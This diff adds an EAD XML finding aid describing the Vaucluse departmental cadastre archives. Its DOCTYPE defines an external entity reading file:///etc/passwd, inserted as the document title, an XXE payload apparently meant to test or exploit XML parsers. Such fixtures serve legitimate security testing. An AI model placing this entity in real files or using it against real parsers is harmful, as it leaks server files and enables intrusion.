@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ead[
+<!ENTITY FRAD084 "<orgname>Archives départementales de Vaucluse</orgname>">
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+<ead xmlns="urn:isbn:1-931666-22-9" xmlns:xi="http://www.w3.org/2001/XInclude"
+ xmlns:xlink="http://www.w3.org/1999/xlink"
+ xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+<eadheader>
+<eadid url="https://earchives.vaucluse.fr/document/FRAD084_cadastre">FRAD084_cadastre</eadid>
+<filedesc>
+<titlestmt>
+<titleproper>&xxe;</titleproper>
+<subtitle>Catalogue numérique</subtitle>
+</titlestmt>
+<publicationstmt>
+<publisher>Archives départementales de Vaucluse</publisher>
+<address>
+<addressline>Avignon</addressline>
+</address>
+<date>2008, mise à jour 2010</date>
+</publicationstmt>
+</filedesc>
+<profiledesc>
+<creation>Instrument de recherche produit au moyen du logiciel Arkhéïa Aide au classement de la société Anaphore sarl, version 9.3.1 du <date calendar="gregorian" era="ce" normal="2023-04-28">vendredi 28 avril 2023</date>.
+Date de l'export : <date calendar="gregorian" era="ce" normal="2023-05-10">mercredi 10 mai 2023</date> (15:35 h)</creation>
+<langusage>Instrument de recherche rédigé en <language langcode="fre" scriptcode="Latn">français</language>
+</langusage>
+</profiledesc>
+</eadheader>
+<archdesc level="collection">
+<did>
+<unittitle>&FRAD084;</unittitle>
+<unitdate label="Dates extrêmes" normal="1809/1907">1809-1907</unitdate>
+<physdesc label="Description physique">
+<extent type="unités description" label="Nombre d'unités de niveau bas">2141</extent>
+</physdesc>
+<dao xlink:type="simple" xlink:href="https://v-earchives.vaucluse.fr/viewer/image_ronde/FRAD084_cadastre_ronde.png" xlink:title="Extrait du cadastre de Gigondas, section D (détail), 1831 (AD Vaucluse 3 P 2/49 8)"/>
+<dao xlink:type="simple" xlink:href="https://v-earchives.vaucluse.fr/ajax/img/image_ronde/FRAD084_cadastre_ronde.png" xlink:title="Extrait du cadastre de Gigondas, section D (détail), 1831 (AD Vaucluse 3 P 2/49 8)/format/thumb" xlink:role="thumbnail"/>
+</did>
+<controlaccess>
+<head>Descripteurs</head>
+<genreform type="filtre">cadastre</genreform>
+<subject>cadastre</subject>
+<name role="producteur">Service du cadastre</name>
+<geogname>Vaucluse (France)</geogname>
+</controlaccess>
+<dsc type="othertype">
+<c id="FRAD084_cadastre_de-1">
+<did>
+<unitid type="cote-original" label="Cote de l'original">3 P 2-001/1<extptr xlink:type="simple" xlink:href="https://earchives.vaucluse.fr/document/FRAD084_cadastre#de-2"/>
+</unitid>
+<unittitle label="Intitulé">Feuille 1</unittitle>
+<unitdate label="Date" normal="1836">1836</unitdate>
+<materialspec type="données mathématiques" label="Échelle">1 :2500</materialspec>
+</did>
+<otherfindaid>
+<extref xlink:href="https://earchives.vaucluse.fr/document/FRAD084_cadastre#de-4"/>
+</otherfindaid>
+</c>
+</dsc>
+</archdesc>
+</ead>
